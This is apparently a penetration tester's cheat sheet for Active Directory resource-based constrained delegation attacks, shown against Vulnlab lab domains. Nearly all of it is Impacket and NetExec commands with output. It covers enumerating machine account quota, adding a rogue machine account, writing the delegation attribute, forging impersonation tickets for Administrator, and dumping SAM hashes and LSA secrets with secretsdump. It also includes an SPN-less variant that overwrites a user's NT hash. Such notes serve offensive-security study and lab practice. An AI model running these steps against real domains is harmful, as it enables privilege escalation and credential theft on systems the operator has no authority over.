# RBCD
### Enumerate MachineAccountQuota
```bash
➜  nxc ldap DC01.push.vl -u kelly.hill -p '<REDACTED>' -M maq
SMB         10.10.217.5     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:push.vl) (signing:True) (SMBv1:False)
LDAP        10.10.217.5     389    DC01             [+] push.vl\kelly.hill:<REDACTED>
MAQ         10.10.217.5     389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.10.217.5     389    DC01             MachineAccountQuota: 10
```
### Create a new machine account
```bash
➜  addcomputer.py -computer-name 'MEOW$' -computer-pass 'Summer2024!' -dc-host push.vl -domain-netbios push.vl push.vl/kelly.hill:'<REDACTED>'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account MEOW$ with password Summer2024!.
```
### Read the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
```bash
➜  rbcd.py -delegate-to 'MS01$' -dc-ip 10.10.217.5 -action 'read' 'push.vl/kelly.hill:<REDACTED>'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```
### Write the attribute
```bash
➜  rbcd.py -delegate-from 'MEOW$' -delegate-to 'MS01$' -dc-ip 10.10.217.5 -action 'write' 'push.vl/kelly.hill:<REDACTED>'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] MEOW$ can now impersonate users on MS01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MEOW$        (S-1-5-21-1451457175-172047642-1427519037-3602)
```
### Obtain a ticket
```bash
➜  getST.py -spn 'cifs/MS01.push.vl' -impersonate Administrator -dc-ip 10.10.217.5 'push.vl/MEOW$:Summer2024!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
### Pass the ticket
```bash
➜  export KRB5CCNAME=Administrator.ccache
```
```
➜  secretsdump.py MS01.push.vl -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x1a2f736cde34f0733b3cc6f7ec68c413
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
...
```
# SPN-less RBCD
We can perform RBCD even if the MachineAccountQuota is set to 0
```bash
➜  nxc ldap phantom.vl -u svc_sspr -p '<REDACTED>' -M maq
SMB         10.10.123.78    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
LDAP        10.10.123.78    389    DC               [+] phantom.vl\svc_sspr:<REDACTED>
MAQ         10.10.123.78    389    DC               [*] Getting the MachineAccountQuota
MAQ         10.10.123.78    389    DC               MachineAccountQuota: 0
```
### Normal RBCD
Instead of passing a machine account in the `-delegate-from` option, we pass a normal user account
```bash
➜  rbcd.py -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip '10.10.123.78' -action 'write' 'phantom.vl'/'wsilva':'P@ssw0rd'  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty  
[*] Delegation rights modified successfully!  
[*] wsilva can now impersonate users on DC$ via S4U2Proxy  
[*] Accounts allowed to act on behalf of other identity:  
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
```
### Obtain a TGT through overpass-the-hash to use RC4
```bash
➜  getTGT.py -hashes :$(pypykatz crypto nt 'P@ssw0rd') 'phantom.vl'/'wsilva'  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[*] Saving ticket in wsilva.ccache
```
```bash
➜  export KRB5CCNAME=wsilva.ccache
```
### Obtain the TGT session key
```bash
➜  python3 ~/tools/windows/impacket-pr/examples/describeTicket.py wsilva.ccache | grep 'Ticket Session Key'  
[*] Ticket Session Key            : e826a54fce399da484eae4b39c3bc72a
```
### Change the controlledaccountwithoutSPN's NT hash with the TGT session key
```bash
➜  smbpasswd.py -newhashes :e826a54fce399da484eae4b39c3bc72a 'phantom.vl'/'wsilva':'P@ssw0rd'@'DC.phantom.vl'  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[*] NTLM hashes were changed successfully.
```
### Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy
```bash
➜  python3 ~/tools/windows/impacket-pr/examples/getST.py -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/DC.phantom.vl" 'phantom.vl'/'wsilva'  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[*] Impersonating Administrator  
[*] Requesting S4U2self+U2U  
[*] Requesting S4U2Proxy  
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```
### Pass the ticket
```bash
➜  export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```
```
➜  secretsdump.py DC.phantom.vl -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xa08cda6a38d423ba98b6f79cf6c7880f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
....
```
# Resources
- https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd
- https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
- https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users
- https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html
- https://www.youtube.com/watch?v=DH4dFwNTb9A&ab_channel=vulnlab
- https://seriotonctf.github.io/2024/07/14/Phantom-Vulnlab/
# Vulnlab Machines/Chains
- Phantom
- Heron
- Push
- Reflection
- Bruno
